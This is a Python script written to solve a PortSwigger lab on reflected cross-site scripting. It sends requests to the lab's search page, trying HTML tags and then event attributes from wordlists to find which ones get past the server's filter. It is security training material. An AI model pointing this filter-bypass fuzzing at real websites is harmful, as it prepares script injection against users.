# The script below was made to help solve the following lab:
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked

# The script iterates through a list of html tags looking for one that can make it past the server filter.
# After a tag is found, events are iterated in order to find the ones not blacklisted.

# The actual payload can be found in the xss-reflected-html.html file in this directory.

import sys
import requests

SUB_DOMAIN = "" # Change This Line With Labs Subdomain
SEARCH_URL = "https://" + SUB_DOMAIN + "." + "web-security-academy.net/?search="


def load_file_lines(file_name):
    try:
        print(f"Loading {file_name}...")
        array = []
        with open(file_name, 'r') as file:
            for line in file:
                array.append(line.strip())
        return array
    except FileNotFoundError:
        print(f"Error: File '{file_name}' not found.")
    return None

def find_tag(tags):
    for tag in tags:
        response = requests.get(SEARCH_URL + "<" + tag + ">")
        status = response.status_code
        print(f"{tag} --> {status}")
        if status == 200:
            return tag
    return None

def find_event(tag, events):
    valid_events = []
    for event in events:
        response = requests.get(SEARCH_URL + "<" + tag + " " + event + "=1" ">")
        status = response.status_code
        print(f"{event} --> {status}")
        if status == 200:
            valid_events.append(event)
    if len(valid_events) > 0:
        return valid_events
    return None

def main():
    HTML_TAGS = load_file_lines("../../Word-Lists/html-tags.txt")
    if HTML_TAGS is None:
        print("Something went wrong loading html tags...")
        sys.exit(1)
    VALID_TAG = find_tag(HTML_TAGS)
    if VALID_TAG is None:
        print("Valid tags were not found...")
        sys.exit(1)
    print(f"Valid Tag Found: {VALID_TAG}")
    EVENTS = load_file_lines("../../Word-Lists/events.txt")
    if EVENTS is None:
        print("Something went wrong trying to load events")
        sys.exit(1)
    VALID_EVENTS = find_event(VALID_TAG, EVENTS)
    if VALID_EVENTS is None:
        print("Valid event was not found...")
        sys.exit(1)
    print(f"Valid events found for {VALID_TAG}:\n {VALID_EVENTS}")
    return 0

if __name__ == "__main__":
    main()
